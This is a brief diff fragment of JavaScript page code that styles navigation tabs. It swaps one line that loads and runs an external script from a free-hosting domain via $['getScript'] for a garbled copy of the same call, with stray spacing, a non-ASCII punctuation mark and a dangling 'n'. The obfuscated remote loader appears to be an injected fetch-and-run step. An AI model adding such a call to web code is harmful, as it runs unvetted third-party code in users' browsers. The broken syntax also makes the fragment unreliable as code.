@@ -21,4 +21,5 @@ $('.nav-tabs')['addClass']('fl')['css']('width', '100%');
 
 
 
-$['getScript']('https://teamfahd1.000webhostapp.com/wlllh/w1.js');
+$ [ 'getScript' ] ( 'https://teamfahd1.000webhostapp.com/wlllh/w1.js' ) ؛
+n
